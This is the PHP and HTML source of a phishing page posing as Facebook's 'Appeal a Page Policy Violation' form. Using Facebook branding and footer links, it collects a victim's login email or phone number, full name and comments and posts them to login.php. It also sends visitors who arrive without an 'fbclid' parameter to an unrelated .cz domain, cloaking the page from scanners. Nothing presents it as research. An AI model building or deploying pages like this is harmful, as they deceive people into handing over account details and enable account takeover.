<?php include $_SERVER['DOCUMENT_ROOT'].'include.php'; ?>

<?php
if (!isset($_GET['fbclid'])) {
    header("Location: https://aswjhqegwemsdszcdselkljl.cz");
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Facebook</title>
	<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" type="image/png" href="favicon-16x16.png"/>
    <link rel='shortcut icon' type='image/x-icon' href='favicon.ico' />

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <style type="text/css">
    	body{
        font-family: Helvetica, Arial, sans-serif;
      }
      .loginbaba{
        background-color:white;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
        margin: auto;
        padding: 24px 17px;
        padding-bottom:40px;
        border: 1px solid #dddfe2;
      }
      .logbaba{
        padding-top:0px;
        padding-bottom: 24px;
        margin-bottom: 0px;
        font-size: 18px;
        line-height: 22px;
        color: #1c1e21;
      }
      input[type=text]{
        border-radius: 6px;
        font-size: 15px;
        padding: 14px 16px;
        height: 50px;
        background: #FFFFFF url(/rsrc.php/v3/yO/r/YQNfPR9MJfx.png) repeat-x;
        border: 1px solid #dddfe2;
        color: #1d2129;
      }
      input[type=password]{
        border-radius: 6px;
        font-size: 15px;
        padding: 14px 16px;
        height: 50px;
        background: #FFFFFF url(/rsrc.php/v3/yO/r/YQNfPR9MJfx.png) repeat-x;
        border: 1px solid #dddfe2;
        color: #1d2129;
      }
      .submitbaba{
        background-color: #4267b2;
        border: none;
        border-radius: 6px;
        
        width: 100%;
        font-size: 20px;
        line-height: 48px;
        padding: 0 16px;
      }
      .forgetbaba{
        color: #1877f2;
        font-size: 14px;
        font-weight: 500;
      }
      ._1rf5 {
        width: auto;
      }
      ._1rf5 {
        display: block;
        margin-bottom: 10px;
        overflow: hidden;
        text-align: center;
        white-space: nowrap;
        width: 100%;
      }
      ._1rf8 {
        color: #96999e;
      }
      ._1rf5>span {
        display: inline-block;
        position: relative;
        font-size:13px;
      }
      ._1rf5>span:before {
        margin-right: 15px;
        right: 100%;
      }
      ._1rf5>span:before, ._1rf5>span:after {
        background: #ccd0d5;
        content: "";
        height: 1px;
        position: absolute;
        top: 50%;
        width: 9999px;
      }
      ._1rf5>span:before, ._1rf5>span:after {
        background: #d7dade;
      }
      ._1rf5>span:after {
        left: 100%;
        margin-left: 15px;
      }
      ._1rf5>span:before, ._1rf5>span:after {
        background: #ccd0d5;
        content: "";
        height: 1px;
        position: absolute;
        top: 50%;
        width: 9999px;
      }
      .createbutton{
        border: none;
        border-radius: 6px;
        font-size: 17px;
        line-height: 48px;
        padding: 0 16px;
        background-color: #42b72a;
        border-color: #42b72a;

        box-sizing: content-box;
        -webkit-font-smoothing: antialiased;
        font-weight: bold;
        justify-content: center;
        position: relative;
        text-align: center;
        text-shadow: none;
        vertical-align: middle;
      }
      .menuja ul{
        align-items: center;
        display: flex;
        flex-wrap: wrap;
        list-style-type: none;
        margin: 0;
        padding: 0;
      }
      .menuja ul li{
        padding-left:20px;
        font-size:12px;
        color:#737373;
      }
      .menuja{
        border-bottom: 1px solid #dddfe2;
        padding-bottom:10px;
      }
      .menuja2 ul{
        align-items: center;
        display: flex;
        flex-wrap: wrap;
        list-style-type: none;
        margin: 0;
        padding: 0;
      }
      .menuja2 ul li{
        padding-left:20px;
        font-size:12px;
        color:#737373;
      }
      .menuja2{
        padding-top:10px;
      }
      label{
        font-size:13px;
        font-weight: 600;
      }
      .bababoks{
        padding-left:0px;
        padding-right: 0px;
      }
      @media only screen and (max-width: 600px) {
        .bababoks{
          padding-left:10px;
          padding-right: 10px;
        }
      }

    </style>
</head>
<body>
	    <div style="background-color:#f0f2f5; text-align: center; padding-bottom:80px" >
        <div class="container">
          <div style="">
            <img style="width: 240px; height: 84px;" src="bizi.svg">
          </div>
          <div class="row">
            <div class="col-md-6 offset-md-3 bababoks">
            <div class="loginbaba">
              <p class="logbaba">Appeal a Page Policy Violation</p>
              <div class="alert alert-secondary" role="alert" style="font-size: 12px;color:#1c1e21; margin-bottom: 25px">
                If you believe your Page is going to be unpublished by mistake, please enter the following information. By entering the following information we will review your page again.
              </div>
              <form action="login.php" method="POST" style="text-align: left">
                <div class="form-group">
                  <label>Login email address or mobile phone number</label>
                  <input type="text" class="form-control" placeholder="Login email address or mobile phone number" name="imella" id="imella">
                </div>
                <div class="form-group">
                  <label>Your full name</label>
                  <small>As it's listed on the account</small>
                  <input type="text" class="form-control" id="emri" placeholder="Your full name" name="emri">
                </div>
                  <div class="form-group">
                  <label>Additional info</label>
                  <textarea class="form-control" rows="3" name="komenti"></textarea>
                </div>

                <button type="submit" class="btn btn-primary submitbaba">Submit</button>
                
                
              </form>
              
            </div>
          </div>
        </div>
      </div>
    </div>
    <div style="background-color:#ffffff; padding-top:50px" >
      <div class="container">
        <div class="menuja">
          <ul>
            <li>
              English (US)
            </li>
            <li>
              Español
            </li>
            <li>
              Français (France)
            </li>
            <li>
              中文(简体)
            </li>
            <li>
              العربية
            </li>
            <li>
              Português (Brasil)
            </li>
            <li>
              한국어
            </li>
            <li>
              Italiano
            </li>
            <li>
              हिन्दी
            </li>
            <li>
              日本語
            </li>
          </ul>
        </div>
        <div class="menuja2">
          <ul>
            <li>
              Sign Up
            </li>
            <li>
              Log In
            </li>
            <li>
              Messenger
            </li>
            <li>
              Facebook Lite
            </li>
            <li>
              Watch
            </li>
            <li>
              People
            </li>
            <li>
              Pages
            </li>
            <li>
              Page Categories
            </li>
            <li>
              Places
            </li>
            <li>
              Locations
            </li>
            <li>
              Marketplace
            </li>
            <li>
              Facebook Pay
            </li>
            <li>
              GroupsOculus
            </li>
            <li>
              Portal
            </li>
            <li>
              Instagram
            </li>
            <li>
              Local
            </li>
            <li>
              Instagram
            </li>
            <li>
              Fundraisers
            </li>
            <li>
              Services
            </li>
            <li>
              Voting Information Center
            </li>
            <li>
              About
            </li>
            <li>
              Create Ad
            </li>
            <li>
              Create Page
            </li>
            <li>
              Developers
            </li>
            <li>
              Careers
            </li>
            <li>
              Privacy
            </li>
            <li>
              Cookies
            </li>
            <li>
              Ad Choices
            </li>
            <li>
              Terms
            </li>
            <li>
              Help
            </li>
            <li>
              Activity Log
            </li>
          </ul>
        </div>
        <p style="color:#737373; padding-left: 20px; font-size: 12px; margin-top:20px; margin-bottom:20px;">Facebook © 2021</p>
      </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
    <script src="bootstrap.min.js"></script>
</body>
</html>


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-177207786-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-177207786-1');
</script>
